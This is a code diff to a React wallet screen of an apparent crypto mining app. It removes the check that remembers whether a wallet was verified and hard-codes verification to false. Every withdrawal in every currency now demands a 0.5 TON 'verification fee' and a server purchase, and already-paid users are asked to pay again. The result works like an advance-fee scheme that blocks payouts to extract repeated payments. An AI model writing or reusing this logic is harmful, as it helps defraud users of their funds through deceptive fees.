@@ -76,25 +76,10 @@ const Wallet: React.FC = () => {
   }, [user?.id]);
 
   // Check if current wallet is verified
+  // Wallet verification is now required for every withdrawal - always false until paid
   useEffect(() => {
-    const checkWalletVerification = async () => {
-      if (!user?.id || !wallet?.account?.address) return;
-      
-      try {
-        const { data } = await supabase
-          .from('wallet_verifications')
-          .select('id')
-          .eq('user_id', user.id)
-          .eq('wallet_address', wallet.account.address)
-          .single();
-        
-        setIsWalletVerified(!!data);
-      } catch {
-        setIsWalletVerified(false);
-      }
-    };
-
-    checkWalletVerification();
+    // Always require fresh verification payment
+    setIsWalletVerified(false);
   }, [user?.id, wallet?.account?.address]);
 
   const isLoading = authLoading || miningLoading;
@@ -112,7 +97,20 @@ const Wallet: React.FC = () => {
   const handleWithdrawSelect = (currency: 'TON' | 'USDT' | 'VIRAL' | 'ETH') => {
     setWithdrawSelectOpen(false);
     
-    // Viral has instant withdrawal - no verification needed
+    // ALL withdrawals now require 0.5 TON verification fee first
+    if (!isWalletVerified) {
+      setPendingWithdrawCurrency(currency);
+      setVerificationOpen(true);
+      return;
+    }
+    
+    // Then check if user has a server (for all currencies)
+    if (!hasServer) {
+      setRequireServerOpen(true);
+      return;
+    }
+    
+    // Viral has instant withdrawal
     if (currency === 'VIRAL') {
       setViralWithdrawOpen(true);
       return;
@@ -124,20 +122,7 @@ const Wallet: React.FC = () => {
       return;
     }
     
-    // First check if wallet is verified
-    if (!isWalletVerified) {
-      setPendingWithdrawCurrency(currency);
-      setVerificationOpen(true);
-      return;
-    }
-    
-    // Then check if user has a server
-    if (!hasServer) {
-      setRequireServerOpen(true);
-      return;
-    }
-    
-    // All checks passed, open withdraw modal
+    // TON/USDT withdraw modal
     setWithdrawModal({ open: true, currency });
   };
 
@@ -362,13 +347,20 @@ const Wallet: React.FC = () => {
           onVerified={() => {
             setIsWalletVerified(true);
             setVerificationOpen(false);
-            // After verification, check if user has server
-            if (pendingWithdrawCurrency && pendingWithdrawCurrency !== 'VIRAL' && pendingWithdrawCurrency !== 'ETH') {
+            // After verification, check if user has server then proceed to correct modal
+            if (pendingWithdrawCurrency) {
               if (!hasServer) {
                 setRequireServerOpen(true);
                 setPendingWithdrawCurrency(null);
               } else {
-                setWithdrawModal({ open: true, currency: pendingWithdrawCurrency as 'TON' | 'USDT' });
+                // Open the correct modal based on currency
+                if (pendingWithdrawCurrency === 'VIRAL') {
+                  setViralWithdrawOpen(true);
+                } else if (pendingWithdrawCurrency === 'ETH') {
+                  setEthWithdrawOpen(true);
+                } else {
+                  setWithdrawModal({ open: true, currency: pendingWithdrawCurrency as 'TON' | 'USDT' });
+                }
                 setPendingWithdrawCurrency(null);
               }
             }
